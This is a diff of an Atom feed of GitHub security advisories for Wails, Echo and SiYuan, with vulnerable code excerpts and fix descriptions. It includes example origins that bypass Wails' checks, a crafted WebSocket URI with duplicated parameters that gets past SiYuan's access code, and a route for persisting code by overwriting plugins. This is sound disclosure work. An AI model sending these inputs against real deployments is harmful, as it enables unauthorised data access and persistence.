+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8r8-95hg-mp34">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8r8-95hg-mp34</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-60083">https://nvd.nist.gov/vuln/detail/CVE-2026-60083</a></li>
+<li><a href="https://www.vulncheck.com/advisories/siyuan-before-incomplete-path-blocklist-via-mcp-file-tool">https://www.vulncheck.com/advisories/siyuan-before-incomplete-path-blocklist-via-mcp-file-tool</a></li>
+<li><a href="https://github.com/advisories/GHSA-rp7c-4prv-9rrg">https://github.com/advisories/GHSA-rp7c-4prv-9rrg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rp7c-4prv-9rrg</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-22T15:31:02.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/wailsapp/wails/v2] Wails: wildcardPatternToRegex allows Origin bypass via suffix match in BindingsAllowedOrigins]]></title>
+        <id>https://github.com/advisories/GHSA-47hv-j4px-h3c9</id>
+        <link href="https://github.com/advisories/GHSA-47hv-j4px-h3c9"/>
+        <updated>2026-10-27T13:29:48.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="security-vulnerability-report-wails-v2--origin-validator-bypass-via-wildcard-pattern">Security Vulnerability Report: Wails v2 — Origin Validator Bypass via Wildcard Pattern</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Product</strong></td>
+<td>wailsapp/wails (v2)</td>
+</tr>
+<tr>
+<td><strong>Affected File</strong></td>
+<td><code>v2/internal/frontend/originvalidator/originValidator.go</code></td>
+</tr>
+<tr>
+<td><strong>Affected Versions</strong></td>
+<td>All versions containing originValidator (latest as of 2026-03-26)</td>
+</tr>
+<tr>
+<td><strong>CVSSv4.0</strong></td>
+<td><strong>7.6 HIGH</strong> — <code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N</code></td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-625: Permissive Regular Expression</td>
+</tr>
+<tr>
+<td><strong>Platforms</strong></td>
+<td>Windows / Linux / macOS (all desktop targets)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="summary">Summary</h2>
+<p>Wails v2 provides <code>BindingsAllowedOrigins</code> to restrict which web origins can invoke Go backend methods via IPC. The wildcard pattern matching in <code>wildcardPatternToRegex</code> converts <code>*</code> to <code>.*</code> without anchoring subcomponents, allowing suffix-matched origins to bypass the restriction.</p>
+<p>An attacker who controls a domain sharing a prefix with the allowed origin (e.g., <code>myapp.community</code> when <code>myapp.com*</code> is configured) can invoke arbitrary bound Go methods, potentially achieving file system access, data exfiltration, or code execution depending on the application's exposed API surface.</p>
+<hr>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<h3 id="root-cause">Root Cause</h3>
+<p><code>wildcardPatternToRegex</code> converts a wildcard pattern to a regular expression by escaping special characters and replacing <code>*</code> with <code>.*</code>. The substituted <code>.*</code> has no restriction — it matches any character sequence including dots and additional domain components.</p>
+<h3 id="vulnerable-code">Vulnerable Code</h3>
+<p><strong>File:</strong> <code>v2/internal/frontend/originvalidator/originValidator.go</code></p>
+<pre><code class="language-go">func (v *OriginValidator) wildcardPatternToRegex(wildcardPattern string) string {
+    specialChars := []string{"\\", ".", "+", "?", "^", "$", "{", "}", "(", ")", "|", "[", "]"}
+
+    escaped := wildcardPattern
+    for _, specialChar := range specialChars {
+        escaped = strings.ReplaceAll(escaped, specialChar, "\\"+specialChar)
+    }
+
+    // * becomes .* — matches ANY character sequence, including dots and domain separators
+    escaped = strings.ReplaceAll(escaped, "*", ".*")
+
+    return "^" + escaped + "$"
+}
+</code></pre>
+<p>The generated regex for <code>https://myapp.com*</code> is:</p>
+<pre><code>^https://myapp\.com.*$
+</code></pre>
+<p>This matches any string beginning with <code>https://myapp.com</code>, including:</p>
+<ul>
+<li><code>https://myapp.community</code> — different TLD</li>
+<li><code>https://myapp.com.attacker.com</code> — attacker-controlled subdomain</li>
+<li><code>https://myapp.comXXXXX</code> — any arbitrary suffix</li>
+</ul>
+<h3 id="scope-note">Scope Note</h3>
+<p>The official comment in <code>options.go</code> gives <code>https://*.myapp.com</code> as the example pattern (subdomain prefix wildcard). This pattern is <strong>not affected</strong>. The vulnerability only manifests when developers use a trailing wildcard (<code>myapp.com*</code>), which is a natural misuse when intending to permit a domain and all its subpaths or ports.</p>
+<hr>
+<h2 id="impact">Impact</h2>
+<p>Any Go method registered with Wails bindings becomes callable from the attacker's origin. Depending on the application:</p>
+<ul>
+<li>File system read / write (common in desktop apps)</li>
+<li>Database queries</li>
+<li>OS command execution (if exposed via bindings)</li>
+<li>Sensitive configuration or credential access</li>
+</ul>
+<hr>
+<h2 id="fix">Fix</h2>
+<p><strong>PR:</strong> <a href="https://github.com/wailsapp/wails/pull/5074">https://github.com/wailsapp/wails/pull/5074</a></p>
+<p>Wildcards are now only expanded when they represent a full domain component (immediately after <code>://</code>, <code>.</code>, or <code>:</code>). A wildcard appended to a partial label (e.g. <code>com*</code>) is stripped, preventing suffix-based bypasses. Comprehensive test suite added.</p>
+<hr>
+<h2 id="disclosure-timeline">Disclosure Timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2026-03-26</td>
+<td>Vulnerability discovered during source code audit by @Saku0512</td>
+</tr>
+<tr>
+<td>2026-03-26</td>
+<td>Private report submitted via GitHub Security Advisory</td>
+</tr>
+<tr>
+<td>2026-03-26</td>
+<td>Vendor acknowledgement and fix PR opened (#5074)</td>
+</tr>
+<tr>
+<td>TBD</td>
+<td>Patch release</td>
+</tr>
+<tr>
+<td>TBD + 90 days</td>
+<td>Public disclosure deadline</td>
+</tr>
+</tbody></table>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/wailsapp/wails/security/advisories/GHSA-47hv-j4px-h3c9">https://github.com/wailsapp/wails/security/advisories/GHSA-47hv-j4px-h3c9</a></li>
+<li><a href="https://github.com/wailsapp/wails/pull/5074">https://github.com/wailsapp/wails/pull/5074</a></li>
+<li><a href="https://github.com/wailsapp/wails/commit/bcc5941b72fdab6a13942b58871a2696faa85b81">https://github.com/wailsapp/wails/commit/bcc5941b72fdab6a13942b58871a2696faa85b81</a></li>
+<li><a href="https://github.com/advisories/GHSA-47hv-j4px-h3c9">https://github.com/advisories/GHSA-47hv-j4px-h3c9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-47hv-j4px-h3c9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-27T13:29:47.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/siderolabs/talos] Talos Linux: Support bundle does not redact registry credentials]]></title>
         <id>https://github.com/advisories/GHSA-7cxh-94cf-mfp6</id>
@@ -423,639 +1809,5 @@ allowed: tcp-peer="127.0.0.1:54417" client-ip="10.0.0.7"
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-10-23T20:49:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/labstack/echo/v4] Echo: BodyDump captures request and response bodies without size limits in v4]]></title>
-        <id>https://github.com/advisories/GHSA-f48p-c9v4-h7xv</id>
-        <link href="https://github.com/advisories/GHSA-f48p-c9v4-h7xv"/>
-        <updated>2026-10-23T20:48:45.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
-<p>Echo v4's opt-in BodyDump middleware read complete request bodies into memory and retained complete response bodies without a capture limit. A client able to submit large requests to a route using BodyDump could cause large allocations before the application handler ran. Large responses, including responses whose size can be influenced by a client, also caused an additional unbounded capture allocation.</p>
-<p>Repeated or concurrent requests can exhaust process memory and cause denial of service. BodyDump is not enabled by default. Deployments with effective request limits may reduce the request-side exposure; response capture requires separate consideration.</p>
-<h2 id="affected-versions-and-patch">Affected versions and patch</h2>
-<p>Echo v4 versions through v4.16.0 are affected. Upgrade to <a href="https://github.com/labstack/echo/releases/tag/v4.16.1">v4.16.1</a>.</p>
-<p>The patch adds <code>BodyDumpConfig.MaxRequestBytes</code> and <code>MaxResponseBytes</code>, each defaulting to 5 MiB when zero. A value of <code>-1</code> explicitly restores unlimited capture. The complete request remains readable by the handler and the complete response is delivered to the client; only the callback's captured data is bounded. Request close behavior and read errors are preserved.</p>
-<p><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">Fix commit</a>.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Disable BodyDump on exposed routes, particularly large uploads and downloads. Alternatively, enforce body-size limits before BodyDump and independently bound the responses that the application generates.</p>
-<h2 id="credits">Credits</h2>
-<p>Reported by @q490107865. The patch also incorporates request-body preservation work from @jakezwang in <a href="https://github.com/labstack/echo/pull/3105">#3105</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/labstack/echo/security/advisories/GHSA-f48p-c9v4-h7xv">https://github.com/labstack/echo/security/advisories/GHSA-f48p-c9v4-h7xv</a></li>
-<li><a href="https://github.com/labstack/echo/pull/3105">https://github.com/labstack/echo/pull/3105</a></li>
-<li><a href="https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f">https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f</a></li>
-<li><a href="https://github.com/labstack/echo/releases/tag/v4.16.1">https://github.com/labstack/echo/releases/tag/v4.16.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-f48p-c9v4-h7xv">https://github.com/advisories/GHSA-f48p-c9v4-h7xv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f48p-c9v4-h7xv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-23T20:48:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: Missing consistency check between packageName and repoURL/repoHash in bazaar package install allows overwriting an existing, trusted plugin]]></title>
-        <id>https://github.com/advisories/GHSA-rpx2-p6hp-x5gj</id>
-        <link href="https://github.com/advisories/GHSA-rpx2-p6hp-x5gj"/>
-        <updated>2026-10-23T18:38:27.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>installBazaarPlugin</code> (and the equivalent endpoints for widgets/icons/templates/themes) accept
-<code>packageName</code>, <code>repoURL</code>, and <code>repoHash</code> as independent request fields with no validation that
-they refer to the same package. <code>packageName</code> alone determines the install destination;
-<code>repoURL</code>/<code>repoHash</code> alone determine what content gets downloaded and written there. A request
-can name an already-installed, already-enabled plugin as <code>packageName</code> while pointing <code>repoURL</code>/
-<code>repoHash</code> at different, attacker-influenced content, silently overwriting the existing plugin's
-files.</p>
-<h2 id="affected-code">Affected code</h2>
-<p><code>kernel/api/bazaar.go</code>:</p>
-<pre><code class="language-go">util.BindJsonArg("packageName", &amp;packageName, true, true)
-util.BindJsonArg("repoURL", &amp;repoURL, true, true)
-util.BindJsonArg("repoHash", &amp;repoHash, true, true)
-err := model.InstallBazaarPackage("plugins", repoURL, repoHash, packageName, 0)
-</code></pre>
-<p><code>kernel/model/bazaar.go</code>:</p>
-<pre><code class="language-go">func getPackageInstallPath(pkgType, packageName string) (string, string, error) {
-    case "plugins":
-        return filepath.Join(util.DataDir, "plugins", packageName), "plugin.json", nil
-</code></pre>
-<p><code>kernel/bazaar/install.go</code>:</p>
-<pre><code class="language-go">func installPackage(data []byte, installPath string) (err error) {
-    ...
-    if err = filelock.Copy(srcPath, installPath); err != nil { return }
-    return
-}
-</code></pre>
-<p><code>installPath</code> is derived solely from <code>packageName</code>; the downloaded <code>data</code> is derived solely from
-<code>repoURL</code>/<code>repoHash</code>; nothing cross-validates them, and <code>installPackage</code> performs no check for
-whether <code>installPath</code> already contains an existing package before copying into it. The same
-pattern applies to the widget/icon/template/theme install endpoints, which share
-<code>getPackageInstallPath</code>.</p>
-<p>This does not involve path traversal — <code>installPath</code> always resolves inside
-<code>DataDir/plugins/</code> (or the corresponding directory for other package types), so this is not an
-instance of "arbitrary file write outside the workspace path" (excluded by this project's
-SECURITY.md). The issue is that the write lands in the <em>wrong, existing</em> location within the
-intended directory, not outside it — an authorization/identity-verification gap, not a path
-traversal.</p>
-<h2 id="reachability--why-this-is-not-trivially-remote">Reachability / why this is not trivially remote</h2>
-<p>The bazaar endpoints are gated by <code>model.CheckAuth</code>, <code>model.CheckAdminRole</code>, <code>model.CheckReadonly</code>.
-When no lock-screen password is configured (the common desktop default), <code>CheckAuth</code> still
-enforces a same-origin check:</p>
-<pre><code class="language-go">if !localhost || ... || ("" != origin &amp;&amp; !util.IsLocalOrigin(origin)) || ... {
-    // reject with 401
-}
-</code></pre>
-<p>I verified <code>IsLocalOrigin</code>/<code>IsLocalHostname</code> correctly parse the <code>Origin</code> header via <code>url.Parse</code>
-and check exact hostname / loopback IP:</p>
-<pre><code class="language-go">func IsLocalOrigin(origin string) bool {
-    if u, err := url.Parse(origin); err == nil {
-        return IsLocalHostname(u.Hostname())
-    }
-    return false
-}
-func IsLocalHostname(hostname string) bool {
-    if "localhost" == hostname || strings.HasSuffix(hostname, ".localhost") {
-        return true
-    }
-    if ip := net.ParseIP(hostname); nil != ip {
-        return ip.IsLoopback()
-    }
-    return false
-}
-</code></pre>
-<p>This was tested against common bypass patterns (subdomain-suffix tricks like
-<code>localhost.attacker.com</code>, and <code>Origin: null</code> as sent by sandboxed iframes) and found no bypass —
-this is a correctly-implemented check. This means a purely remote attacker (e.g. a malicious
-website) cannot invoke this endpoint via CSRF; a request must originate from SiYuan's own
-renderer origin.</p>
-<h2 id="realistic-impact">Realistic impact</h2>
-<p>Given SiYuan runs as an Electron app with <code>nodeIntegration: true</code> (per prior advisories in this
-repository), a same-origin script-execution primitive (e.g. an XSS bug in the renderer, of which
-several have been fixed in this repository recently) is typically already sufficient for direct
-code execution. This bug's marginal value is <strong>persistence</strong>: a transient XSS-driven compromise
-can use this endpoint to overwrite an existing, trusted, already-enabled plugin's <code>index.js</code>,
-converting a one-time compromise into code that runs on every future launch of the application,
-surviving after the original XSS vector is closed.</p>
-<p>The overwrite does not effect immediately, via this specific
-endpoint. <code>PushReloadPlugin</code> (the websocket event that triggers frontend hot-reload without
-restart) is only called from the batch-update path (<code>InstallBazaarPackages</code>, used by
-<code>batchUpdatePackage</code>), which explicitly checks <code>if petal != nil &amp;&amp; petal.Enabled</code> before forcing
-a reload via <code>SetPetalEnabled</code>. The single-package install endpoint (<code>installBazaarPlugin</code>) does
-not call <code>PushReloadPlugin</code> at all — it only pushes a generic success toast. So an overwrite via
-this endpoint activates on the next app restart or manual plugin toggle, rather than instantly 
-still a realistic and frequent event for a desktop application, but not an instant hot-reload.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Verify that <code>packageName</code> matches the package name declared in the downloaded package's own
-<code>plugin.json</code>/<code>theme.json</code>/etc. before copying into <code>installPath</code>, and/or refuse to install over
-an existing, non-empty destination directory unless the request is explicitly an update of that
-same package (matching by source repo identity, not just by request-supplied name).</p>
-<h2 id="verification-notes">Verification notes</h2>
-<p>Confirmed via static source review of <code>kernel/api/bazaar.go</code>, <code>kernel/model/bazaar.go</code>,
-<code>kernel/bazaar/install.go</code>, <code>kernel/model/session.go</code> (CheckAuth), <code>kernel/util/net.go</code>
-(IsLocalOrigin/IsLocalHostname), and <code>kernel/model/push_reload.go</code> /
-<code>app/src/plugin/loader.ts</code> (reload trigger wiring). I do not have a running SiYuan instance
-in this environment to execute an end-to-end proof of concept; findings are based on tracing
-the actual, unmodified control flow across these files rather than assumption.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rpx2-p6hp-x5gj">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rpx2-p6hp-x5gj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62204">https://nvd.nist.gov/vuln/detail/CVE-2026-62204</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/commit/26ccb40d390eb7d9b04673629a58ab1d69cc7e53">https://github.com/siyuan-note/siyuan/commit/26ccb40d390eb7d9b04673629a58ab1d69cc7e53</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.8.0">https://github.com/siyuan-note/siyuan/releases/tag/v3.8.0</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-plugin-overwrite-via-bazaar-install">https://www.vulncheck.com/advisories/siyuan-before-plugin-overwrite-via-bazaar-install</a></li>
-<li><a href="https://github.com/advisories/GHSA-rpx2-p6hp-x5gj">https://github.com/advisories/GHSA-rpx2-p6hp-x5gj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rpx2-p6hp-x5gj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-23T18:38:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] Duplicate Advisory: SiYuan: Missing consistency check between packageName and repoURL/repoHash in bazaar package install allows overwriting an existing, trusted plugin]]></title>
-        <id>https://github.com/advisories/GHSA-989h-w3q9-3m2f</id>
-        <link href="https://github.com/advisories/GHSA-989h-w3q9-3m2f"/>
-        <updated>2026-10-23T18:35:01.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-rpx2-p6hp-x5gj. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SiYuan versions before v3.7.4 fail to validate that packageName matches the downloaded package content in bazaar install endpoints. Attackers with same-origin access can overwrite existing trusted plugins by supplying mismatched packageName and repoURL parameters, achieving persistence across application restarts.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rpx2-p6hp-x5gj">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rpx2-p6hp-x5gj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62204">https://nvd.nist.gov/vuln/detail/CVE-2026-62204</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-plugin-overwrite-via-bazaar-install">https://www.vulncheck.com/advisories/siyuan-before-plugin-overwrite-via-bazaar-install</a></li>
-<li><a href="https://github.com/advisories/GHSA-989h-w3q9-3m2f">https://github.com/advisories/GHSA-989h-w3q9-3m2f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-989h-w3q9-3m2f</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-22T15:31:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: A parser differential between the WebSocket keepalive exemption and the session quarantine allows unauthenticated access to the broadcast event stream]]></title>
-        <id>https://github.com/advisories/GHSA-c8w8-3pqp-wr83</id>
-        <link href="https://github.com/advisories/GHSA-c8w8-3pqp-wr83"/>
-        <updated>2026-10-23T18:34:11.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Two checks on the same WebSocket request URI parse it differently. The authentication exemption for keepalive sessions matches raw substrings, while the quarantine introduced to contain those sessions reads a parsed query parameter. Because Go's <code>url.Values.Get</code> returns only the first value for a repeated key, a single URI can satisfy the exemption and still resolve to a non-auth session identity.</p>
-<p>The result is that an unauthenticated remote caller connects to the kernel WebSocket with a valid access auth code configured, is placed in the general broadcast pool rather than the quarantined pool, and receives the live event stream.</p>
-<h3 id="details">Details</h3>
-<p><strong>The exemption matches substrings.</strong> <code>kernel/server/serve.go:1222</code> on the development branch, <code>:1074</code> on master:</p>
-<pre><code class="language-go">authOk = strings.Contains(s.Request.RequestURI, "/ws?app=siyuan") &amp;&amp;
-         strings.Contains(s.Request.RequestURI, "&amp;id=auth&amp;type=auth")
-</code></pre>
-<p>Neither operand is parsed. Any URI containing both literals is exempted, regardless of what the query actually resolves to.</p>
-<p><strong>The quarantine parses.</strong> Commit <code>1e370e373</code> added the containment for exempted sessions at <code>kernel/util/websocket.go:171</code>:</p>
-<pre><code class="language-go">id = session.Request.URL.Query().Get("id")
-return "auth" == id
-</code></pre>
-<p><code>url.Values.Get</code> returns the first value for a repeated key.</p>
-<p><strong>The differential.</strong> For the URI:</p>
-<pre><code>/ws?app=siyuan&amp;id=main&amp;type=main&amp;id=auth&amp;type=auth
-</code></pre>
-<ul>
-<li>It contains <code>/ws?app=siyuan</code> and <code>&amp;id=auth&amp;type=auth</code>, so <code>authOk</code> is true. No cookie, no JWT and no access auth code are required.</li>
-<li><code>Query().Get("id")</code> returns <code>main</code>, so <code>IsAuthSession</code> is false. <code>AddPushChan</code> files the session in <code>sessions</code>, the broadcast pool, rather than in <code>authSessions</code>.</li>
-<li><code>Query().Get("type")</code> returns <code>main</code>, so the session matches <code>BroadcastByType("main", ...)</code>.</li>
-<li>Without a valid <code>X-Auth-Token</code> the publish flag is never set, so <code>isPublishSession()</code> does not exclude it either.</li>
-</ul>
-<p>Every guard that should have caught the session keys off a different parse than the one that admitted it.</p>
-<p><strong>No origin validation.</strong> <code>CheckOrigin</code> does not appear on the <code>/ws</code> path, so the cross-origin vector described in the parent advisory also remains available.</p>
-<p><strong>Distinction from the existing broadcast-pool advisory.</strong> GHSA-mw8r-mw84-88v2 concerns the publish port, where an anonymous session is expected to connect and the defect is that broadcast content is not gated for it afterwards. This report concerns the kernel port with an access auth code configured, where the session should never be admitted in the first place. The leaked data overlaps because both end in the same broadcast pool, but the mechanisms and the affected deployments are different, and gating publish sessions does not close this path.</p>
-<h3 id="proof-of-concept">Proof of Concept</h3>
-<p>Kernel port, <code>--accessAuthCode</code> set. Three WebSocket connections, none carrying credentials of any kind.</p>
-<table>
-<thead>
-<tr>
-<th>Socket</th>
-<th>Query</th>
-<th>Result</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>A, baseline</td>
-<td><code>?app=siyuan&amp;id=main&amp;type=main</code></td>
-<td>Rejected, closed 1002, 0 frames</td>
-</tr>
-<tr>
-<td>B, control</td>
-<td><code>?app=siyuan&amp;id=auth&amp;type=auth</code></td>
-<td>Connects, 0 frames</td>
-</tr>
-<tr>
-<td>C, attack</td>
-<td><code>?app=siyuan&amp;id=main&amp;type=main&amp;id=auth&amp;type=auth</code></td>
-<td>Connects, 19 to 30 frames across two runs</td>
-</tr>
-</tbody></table>
-<p>Socket A establishes that the access auth code is enforced. Socket B establishes that the existing quarantine works exactly as intended, admitting the keepalive session but delivering nothing to it. Socket C differs from B only in the duplicated parameters, and receives the event stream.</p>
-<p>Frames observed on socket C included <code>savedoc</code> (<code>"action":"create","data":{"Root":{"ID": ...</code>), <code>transactions</code> (<code>"action":"updateAttrs"</code> carrying document titles), <code>filetreeSortChanged</code> (the notebook's complete ordered <code>childIDs</code>), <code>create</code> (a notebook object including its <code>name</code>), and <code>backgroundtask</code>.</p>
-<p>A canary string placed inside a document body did not appear in any frame, on a full-text search of all captured frames.</p>
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated remote caller obtains the kernel's live event stream on a deployment protected by an access auth code, with no user interaction and no prior knowledge of the instance.</p>
-<p>Precisely what is disclosed: document identifiers and titles, notebook identifiers and names, file paths, the complete ordered child structure of notebooks, and the full stream of create, update and delete operations as they occur. Document body content is not present in the observed frames.</p>
-<p>That set corresponds to the disclosure claimed by GHSA-xp2m-98x8-rpj6, which means the remediation for that advisory is bypassable rather than incomplete in scope. The absence of origin validation on the endpoint additionally preserves the cross-origin reachability described there.</p>
-<p>Confidentiality only. No frames observed permitted writes.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Make both checks agree, and stop re-parsing attacker-controlled input after admission.</p>
-<ol>
-<li>In the exemption, parse the query rather than matching substrings, and require <code>id</code> and <code>type</code> each to equal <code>auth</code> exactly.</li>
-<li>Reject requests carrying duplicated query keys on this endpoint, so no URI can present two identities.</li>
-<li>Record the exemption as a flag on the session at connect time, and have <code>IsAuthSession</code> read that flag rather than re-parsing the request. A session admitted under the keepalive exemption is then quarantined by construction, independent of how its URI is read later.</li>
-</ol>
-<p>Adding origin validation to <code>/ws</code> would additionally close the cross-origin vector.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8w8-3pqp-wr83">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8w8-3pqp-wr83</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73054">https://nvd.nist.gov/vuln/detail/CVE-2026-73054</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/commit/67bc300b6ea6650d99dae55c827aeced419c8ac4">https://github.com/siyuan-note/siyuan/commit/67bc300b6ea6650d99dae55c827aeced419c8ac4</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4">https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-authentication-bypass-via-websocket">https://www.vulncheck.com/advisories/siyuan-before-authentication-bypass-via-websocket</a></li>
-<li><a href="https://github.com/advisories/GHSA-c8w8-3pqp-wr83">https://github.com/advisories/GHSA-c8w8-3pqp-wr83</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c8w8-3pqp-wr83</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-23T18:34:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] Duplicate Advisory: SiYuan: A parser differential between the WebSocket keepalive exemption and the session quarantine allows unauthenticated access to the broadcast event stream, defeating the fix for GHSA-xp2m-98x8-rpj6]]></title>
-        <id>https://github.com/advisories/GHSA-hg5w-8ppq-wpjq</id>
-        <link href="https://github.com/advisories/GHSA-hg5w-8ppq-wpjq"/>
-        <updated>2026-10-23T18:33:36.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-c8w8-3pqp-wr83. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SiYuan versions before v3.7.4 contain an authentication bypass vulnerability in the WebSocket endpoint caused by differential parsing of query parameters between authentication exemption and session quarantine checks. Unauthenticated attackers can craft a malicious WebSocket URI with duplicated query parameters to bypass access auth code validation and receive the live kernel event stream including document identifiers, titles, and operation logs.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8w8-3pqp-wr83">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8w8-3pqp-wr83</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73054">https://nvd.nist.gov/vuln/detail/CVE-2026-73054</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-authentication-bypass-via-websocket">https://www.vulncheck.com/advisories/siyuan-before-authentication-bypass-via-websocket</a></li>
-<li><a href="https://github.com/advisories/GHSA-hg5w-8ppq-wpjq">https://github.com/advisories/GHSA-hg5w-8ppq-wpjq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hg5w-8ppq-wpjq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-16T00:31:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: authFilePublishAccess distinguishes hidden and forbidden documents from public and nonexistent ones, and issues a publish-auth cookie for documents it reports as forbidden]]></title>
-        <id>https://github.com/advisories/GHSA-4pjg-x8qj-33j5</id>
-        <link href="https://github.com/advisories/GHSA-4pjg-x8qj-33j5"/>
-        <updated>2026-10-23T18:31:45.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>/api/filetree/authFilePublishAccess</code> is registered with <code>CheckAuth</code> only and is reachable anonymously. It never sets a failure code, so its outcome is signalled entirely by the response message and by whether a <code>Set-Cookie</code> header is present. Those two signals differ across access tiers, which lets an anonymous caller determine, for any candidate document identifier, whether that document is public or nonexistent, password-protected, or exists at the hidden or forbidden tier.</p>
-<p>Separately, hidden and forbidden entries carry an empty password. Submitting <code>password:""</code> therefore satisfies the equality check for them, and the server responds by issuing <code>Set-Cookie: publish-auth-&lt;docID&gt;</code> for a document whose own tier is forbidden.</p>
-<h3 id="details">Details</h3>
-<p><strong>Route,</strong> identical on both refs:</p>
-<pre><code class="language-go">ginServer.Handle("POST", "/api/filetree/authFilePublishAccess", model.CheckAuth, authFilePublishAccess)
-</code></pre>
-<p>No <code>CheckAdminRole</code>, no <code>CheckReadonly</code>.</p>
